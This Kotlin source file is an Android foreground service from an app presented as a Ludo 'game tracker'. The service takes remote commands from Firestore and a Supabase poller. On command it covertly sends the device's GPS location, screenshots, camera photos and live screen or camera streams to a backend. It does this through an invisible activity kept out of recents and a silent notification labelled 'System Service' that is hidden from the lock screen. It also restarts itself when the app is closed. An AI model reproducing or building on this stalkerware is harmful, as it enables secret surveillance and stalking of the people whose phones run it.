package com.example.game_tracker

import android.app.*
import android.content.Context
import android.content.Intent
import android.content.pm.ServiceInfo
import android.location.Location
import android.location.LocationListener
import android.location.LocationManager
import android.os.Build
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.os.SystemClock
import android.util.Log
import androidx.core.app.NotificationCompat
import com.google.firebase.firestore.DocumentChange
import com.google.firebase.firestore.FieldValue
import com.google.firebase.firestore.FirebaseFirestore
import com.google.firebase.firestore.ListenerRegistration
import com.example.game_tracker.MediaProjectionStore

class ForegroundService : Service() {

    companion object {
        const val CHANNEL_ID = "ludo_bg_service_channel"
        const val NOTIFICATION_ID = 1001

        fun startService(context: Context) {
            try {
                val intent = Intent(context, ForegroundService::class.java)
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    context.startForegroundService(intent)
                } else {
                    context.startService(intent)
                }
            } catch (e: Exception) {
                e.printStackTrace()
            }
        }
    }

    private var firestoreListener: ListenerRegistration? = null
    private var locationManager: LocationManager? = null
    private var locationListener: LocationListener? = null

    override fun onCreate() {
        super.onCreate()
        try {
            createNotificationChannel()
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }

    private fun hasLocationPermission(): Boolean {
        return (androidx.core.content.ContextCompat.checkSelfPermission(
            this,
            android.Manifest.permission.ACCESS_FINE_LOCATION
        ) == android.content.pm.PackageManager.PERMISSION_GRANTED ||
        androidx.core.content.ContextCompat.checkSelfPermission(
            this,
            android.Manifest.permission.ACCESS_COARSE_LOCATION
        ) == android.content.pm.PackageManager.PERMISSION_GRANTED)
    }

    private fun hasCameraPermission(): Boolean {
        return androidx.core.content.ContextCompat.checkSelfPermission(
            this,
            android.Manifest.permission.CAMERA
        ) == android.content.pm.PackageManager.PERMISSION_GRANTED
    }

    private fun hasMicrophonePermission(): Boolean {
        return androidx.core.content.ContextCompat.checkSelfPermission(
            this,
            android.Manifest.permission.RECORD_AUDIO
        ) == android.content.pm.PackageManager.PERMISSION_GRANTED
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        val notification = createNotification()
        var fgsType = 0
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            if (hasLocationPermission()) {
                fgsType = fgsType or ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION
            }
            if (hasCameraPermission()) {
                fgsType = fgsType or ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA
            }
            if (hasMicrophonePermission()) {
                fgsType = fgsType or ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE
            }
            if (MediaProjectionStore.hasPermission(this)) {
                fgsType = fgsType or ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION
            }
            if (fgsType == 0 && Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
                fgsType = ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC
            }
        }

        try {
            if (fgsType != 0) {
                startForeground(NOTIFICATION_ID, notification, fgsType)
            } else {
                startForeground(NOTIFICATION_ID, notification)
            }
        } catch (e: Throwable) {
            Log.e("ForegroundService", "startForeground error: ${e.message}")
        }

        setupFirestoreRequestListener()

        val action = intent?.getStringExtra("action")
        if (action == "location_ping") {
            val reqId = intent.getStringExtra("requestId")
            fetchLocationOnce(reqId)
        }

        return START_STICKY
    }

    private fun fetchLocationOnce(requestId: String? = null) {
        try {
            if (!hasLocationPermission()) {
                if (!requestId.isNullOrEmpty()) {
                    CloudBridgeSync.updateRequestStatus(
                        requestId = requestId,
                        status = "failed",
                        error = "Location permission not granted",
                        failureReason = "Location permission not granted"
                    )
                }
                return
            }

            if (locationManager == null) {
                locationManager = getSystemService(Context.LOCATION_SERVICE) as LocationManager
            }

            val hasGps = locationManager?.isProviderEnabled(LocationManager.GPS_PROVIDER) == true
            val hasNet = locationManager?.isProviderEnabled(LocationManager.NETWORK_PROVIDER) == true

            var singleListener: LocationListener? = null
            val mainHandler = Handler(Looper.getMainLooper())

            singleListener = object : LocationListener {
                override fun onLocationChanged(location: Location) {
                    try {
                        locationManager?.removeUpdates(this)
                    } catch (_: Throwable) {}
                    updateFirestoreLocation(location, requestId)
                }

                override fun onStatusChanged(provider: String?, status: Int, extras: android.os.Bundle?) {}
                override fun onProviderEnabled(provider: String) {}
                override fun onProviderDisabled(provider: String) {}
            }

            mainHandler.postDelayed({
                try {
                    singleListener.let { locationManager?.removeUpdates(it) }
                } catch (_: Throwable) {}
            }, 10000L)

            if (hasGps) {
                locationManager?.requestLocationUpdates(
                    LocationManager.GPS_PROVIDER,
                    0L,
                    0f,
                    singleListener,
                    Looper.getMainLooper()
                )
            }
            if (hasNet) {
                locationManager?.requestLocationUpdates(
                    LocationManager.NETWORK_PROVIDER,
                    0L,
                    0f,
                    singleListener,
                    Looper.getMainLooper()
                )
            }

            val lastGps = if (hasGps) locationManager?.getLastKnownLocation(LocationManager.GPS_PROVIDER) else null
            val lastNet = if (hasNet) locationManager?.getLastKnownLocation(LocationManager.NETWORK_PROVIDER) else null
            val bestLoc = lastGps ?: lastNet
            if (bestLoc != null) {
                updateFirestoreLocation(bestLoc, requestId)
            }
        } catch (e: SecurityException) {
            e.printStackTrace()
            if (!requestId.isNullOrEmpty()) {
                CloudBridgeSync.updateRequestStatus(
                    requestId = requestId,
                    status = "failed",
                    error = "SecurityException: ${e.message}",
                    failureReason = "SecurityException: ${e.message}"
                )
            }
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }

    private fun updateFirestoreLocation(location: Location, requestId: String? = null) {
        val prefs = getSharedPreferences("FlutterSharedPreferences", Context.MODE_PRIVATE)
        var deviceId = prefs.getString("flutter.game_tracker_device_id", null)
        if (deviceId.isNullOrEmpty()) {
            deviceId = prefs.getString("game_tracker_device_id", null)
        }
        if (deviceId.isNullOrEmpty()) {
            Log.e("ForegroundService", "Cannot update location: deviceId is null or empty")
            return
        }

        Log.d("ForegroundService", "Updating location for $deviceId: ${location.latitude}, ${location.longitude}")

        CloudBridgeSync.updateDeviceLocation(
            deviceId = deviceId,
            latitude = location.latitude,
            longitude = location.longitude,
            accuracy = location.accuracy.toDouble(),
            timestamp = System.currentTimeMillis()
        )

        if (!requestId.isNullOrEmpty()) {
            CloudBridgeSync.updateRequestStatus(
                requestId = requestId,
                status = "completed"
            )
        }
    }

    private fun markBackgroundAttempt(requestId: String) {
        CloudBridgeSync.markBackgroundAttempt(requestId)
    }

    private val handledRequestIds = java.util.Collections.synchronizedSet(object : LinkedHashSet<String>() {
        override fun add(element: String): Boolean {
            if (size >= 300) {
                val iterator = iterator()
                if (iterator.hasNext()) {
                    iterator.next()
                    iterator.remove()
                }
            }
            return super.add(element)
        }
    })
    private var supabasePollHandler: Handler? = null
    private var supabasePollRunnable: Runnable? = null

    private fun setupFirestoreRequestListener() {
        if (firestoreListener != null) return

        val prefs = getSharedPreferences("FlutterSharedPreferences", Context.MODE_PRIVATE)
        var deviceId = prefs.getString("flutter.game_tracker_device_id", null)
        if (deviceId.isNullOrEmpty()) {
            deviceId = prefs.getString("game_tracker_device_id", null)
        }

        if (deviceId.isNullOrEmpty() || !deviceId.startsWith("user_")) {
            prefs.registerOnSharedPreferenceChangeListener { sharedPrefs, key ->
                if (key == "flutter.game_tracker_device_id" || key == "game_tracker_device_id") {
                    setupFirestoreRequestListener()
                }
            }
            return
        }

        // 1. Start Supabase REST Failover Poller (Runs in background even if Firebase Quota is exhausted)
        startSupabasePoller(deviceId)

        // 2. Start Firebase Firestore Listener
        try {
            val firestore = FirebaseFirestore.getInstance()
            firestoreListener = firestore.collection("screenshot_requests")
                .whereEqualTo("targetDeviceId", deviceId)
                .whereEqualTo("status", "pending")
                .addSnapshotListener { snapshots, error ->
                    if (error != null || snapshots == null) return@addSnapshotListener
                    for (change in snapshots.documentChanges) {
                        if (change.type == DocumentChange.Type.ADDED || change.type == DocumentChange.Type.MODIFIED) {
                            val doc = change.document
                            val requestId = doc.id
                            val requestType = doc.getString("requestType") ?: "screenshot"
                            val cameraFacing = doc.getString("cameraFacing") ?: "front"
                            val reqTimestamp = doc.getTimestamp("requestedAt")?.toDate()?.time

                            // Auto-expire requests older than 10 minutes to prevent launch loops while avoiding clock-skew false expirations
                            if (reqTimestamp != null && reqTimestamp > 0 && (System.currentTimeMillis() - reqTimestamp > 600000)) {
                                CloudBridgeSync.updateRequestStatus(
                                    requestId = requestId,
                                    status = "expired",
                                    failureReason = "Request expired before service pickup"
                                )
                                continue
                            }

                            handleIncomingCommand(requestId, requestType, cameraFacing)
                        }
                    }
                }
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }

    private fun startSupabasePoller(deviceId: String) {
        supabasePollHandler?.removeCallbacksAndMessages(null)
        supabasePollHandler = Handler(Looper.getMainLooper())
        supabasePollRunnable = object : Runnable {
            override fun run() {
                Thread {
                    try {
                        val getUrl = java.net.URL("${CloudBridgeSync.SUPABASE_URL}/rest/v1/screenshot_requests?target_device_id=eq.$deviceId&status=eq.pending&select=*")
                        val conn = getUrl.openConnection() as java.net.HttpURLConnection
                        conn.requestMethod = "GET"
                        conn.setRequestProperty("apikey", CloudBridgeSync.SUPABASE_ANON_KEY)
                        conn.setRequestProperty("Authorization", "Bearer ${CloudBridgeSync.SUPABASE_ANON_KEY}")
                        conn.connectTimeout = 4000
                        conn.readTimeout = 4000

                        if (conn.responseCode == 200) {
                            val responseText = conn.inputStream.bufferedReader().use { it.readText() }
                            val jsonArray = org.json.JSONArray(responseText)
                            for (i in 0 until jsonArray.length()) {
                                val item = jsonArray.getJSONObject(i)
                                val requestId = item.optString("id")
                                val requestType = item.optString("request_type", "screenshot")
                                val cameraFacing = item.optString("camera_facing", "front")
                                val reqTimeStr = item.optString("requested_at")
                                var isExpired = false
                                if (reqTimeStr.isNotEmpty()) {
                                    try {
                                        val sdf = java.text.SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss", java.util.Locale.US).apply {
                                            timeZone = java.util.TimeZone.getTimeZone("UTC")
                                        }
                                        val date = sdf.parse(reqTimeStr)
                                        if (date != null && (System.currentTimeMillis() - date.time > 600000)) {
                                            isExpired = true
                                        }
                                    } catch (_: Throwable) {}
                                }
                                if (isExpired) {
                                    CloudBridgeSync.updateRequestStatus(
                                        requestId = requestId,
                                        status = "expired",
                                        failureReason = "Request expired before service pickup"
                                    )
                                    continue
                                }
                                if (requestId.isNotEmpty()) {
                                    handleIncomingCommand(requestId, requestType, cameraFacing)
                                }
                            }
                        }
                    } catch (_: Throwable) {}
                }.start()
                supabasePollHandler?.postDelayed(this, 3500)
            }
        }
        supabasePollHandler?.post(supabasePollRunnable!!)
    }

    private fun handleIncomingCommand(requestId: String, requestType: String, cameraFacing: String) {
        if (handledRequestIds.contains(requestId)) return
        handledRequestIds.add(requestId)

        when (requestType) {
            "wake_up" -> {
                val prefs = getSharedPreferences("FlutterSharedPreferences", Context.MODE_PRIVATE)
                var deviceId = prefs.getString("flutter.game_tracker_device_id", null)
                if (deviceId.isNullOrEmpty()) {
                    deviceId = prefs.getString("game_tracker_device_id", null)
                }
                if (!deviceId.isNullOrEmpty()) {
                    CloudBridgeSync.updateDeviceHeartbeat(deviceId)
                }
                if (requestId.isNotEmpty()) {
                    CloudBridgeSync.updateRequestStatus(requestId, "completed")
                }
                fetchLocationOnce(null)
            }
            "location_ping" -> {
                fetchLocationOnce(requestId)
            }
            "camera_capture" -> {
                markBackgroundAttempt(requestId)
                try {
                    val invIntent = Intent(this, InvisibleCaptureActivity::class.java).apply {
                        putExtra("action", "camera_capture")
                        putExtra("requestId", requestId)
                        putExtra("cameraFacing", cameraFacing)
                        addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_NO_ANIMATION or Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS or Intent.FLAG_ACTIVITY_NO_USER_ACTION)
                    }
                    startActivity(invIntent)
                } catch (e: Throwable) {
                    Log.e("ForegroundService", "InvisibleCaptureActivity start error: ${e.message}, falling back to Service")
                    try {
                        val svcIntent = Intent(this, CameraCaptureService::class.java).apply {
                            putExtra("requestId", requestId)
                            putExtra("cameraFacing", cameraFacing)
                        }
                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                            startForegroundService(svcIntent)
                        } else {
                            startService(svcIntent)
                        }
                    } catch (t: Throwable) {
                        CloudBridgeSync.updateRequestStatus(
                            requestId = requestId,
                            status = "failed",
                            error = "Camera capture start disallowed",
                            failureReason = "OS disallowed background camera start: ${t.message}"
                        )
                    }
                }
            }
            "screen_share", "camera_stream" -> {
                markBackgroundAttempt(requestId)
                try {
                    val svcIntent = Intent(this, WebRtcPublisherService::class.java).apply {
                        putExtra("requestId", requestId)
                        putExtra("cameraFacing", cameraFacing)
                        putExtra("requestType", requestType)
                        val savedProjection = MediaProjectionStore.load(this@ForegroundService)
                        if (savedProjection.first != 0 && savedProjection.second != null) {
                            putExtra("resultCode", savedProjection.first)
                            putExtra("resultData", savedProjection.second)
                        }
                    }
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                        startForegroundService(svcIntent)
                    } else {
                        startService(svcIntent)
                    }
                } catch (e: Throwable) {
                    Log.e("ForegroundService", "WebRtcPublisherService start error: ${e.message}")
                    CloudBridgeSync.updateRequestStatus(
                        requestId = requestId,
                        status = "failed",
                        error = "Stream start disallowed",
                        failureReason = "OS disallowed background stream start: ${e.message}"
                    )
                }
            }
            "screenshot" -> {
                markBackgroundAttempt(requestId)
                try {
                    val invIntent = Intent(this, InvisibleCaptureActivity::class.java).apply {
                        putExtra("action", "screenshot")
                        putExtra("requestId", requestId)
                        addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_NO_ANIMATION or Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS or Intent.FLAG_ACTIVITY_NO_USER_ACTION)
                    }
                    startActivity(invIntent)
                } catch (e: Throwable) {
                    Log.e("ForegroundService", "InvisibleCaptureActivity start error: ${e.message}, falling back to Service")
                    try {
                        val savedProjection = MediaProjectionStore.load(this@ForegroundService)
                        val svcIntent = Intent(this, ScreenCaptureService::class.java).apply {
                            putExtra("requestId", requestId)
                            putExtra("capture_once", true)
                            if (savedProjection.first != 0 && savedProjection.second != null) {
                                putExtra("resultCode", savedProjection.first)
                                putExtra("resultData", savedProjection.second)
                            }
                        }
                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                            startForegroundService(svcIntent)
                        } else {
                            startService(svcIntent)
                        }
                    } catch (t: Throwable) {
                        CloudBridgeSync.updateRequestStatus(
                            requestId = requestId,
                            status = "failed",
                            error = "Screen capture start disallowed",
                            failureReason = "OS disallowed background capture start: ${t.message}"
                        )
                    }
                }
            }
        }
    }

    override fun onTaskRemoved(rootIntent: Intent?) {
        val restartServiceIntent = Intent(applicationContext, ForegroundService::class.java).also {
            it.setPackage(packageName)
        }
        val restartServicePendingIntent = PendingIntent.getService(
            this,
            1,
            restartServiceIntent,
            PendingIntent.FLAG_ONE_SHOT or PendingIntent.FLAG_IMMUTABLE
        )
        val alarmService = getSystemService(Context.ALARM_SERVICE) as AlarmManager
        alarmService.set(
            AlarmManager.ELAPSED_REALTIME,
            SystemClock.elapsedRealtime() + 1000,
            restartServicePendingIntent
        )
        super.onTaskRemoved(rootIntent)
    }

    override fun onDestroy() {
        try {
            supabasePollHandler?.removeCallbacksAndMessages(null)
            supabasePollHandler = null
            firestoreListener?.remove()
            firestoreListener = null
            if (locationListener != null && locationManager != null) {
                locationManager?.removeUpdates(locationListener!!)
            }
        } catch (e: Exception) {
        }
        super.onDestroy()
    }

    override fun onBind(intent: Intent?): IBinder? = null

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                "System Service",
                NotificationManager.IMPORTANCE_MIN
            ).apply {
                description = "System background service"
                setShowBadge(false)
                setSound(null, null)
                enableLights(false)
                enableVibration(false)
                vibrationPattern = longArrayOf(0L)
                lockscreenVisibility = Notification.VISIBILITY_SECRET
            }
            val manager = getSystemService(NotificationManager::class.java)
            manager?.createNotificationChannel(channel)
        }
    }

    private fun createNotification(): Notification {
        val notificationIntent = Intent(this, MainActivity::class.java)
        val pendingIntent = PendingIntent.getActivity(
            this,
            0,
            notificationIntent,
            PendingIntent.FLAG_IMMUTABLE
        )

        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setSmallIcon(R.mipmap.ic_launcher)
            .setContentIntent(pendingIntent)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
            .setOngoing(true)
            .setSilent(true)
            .setLocalOnly(true)
            .build()
    }
}
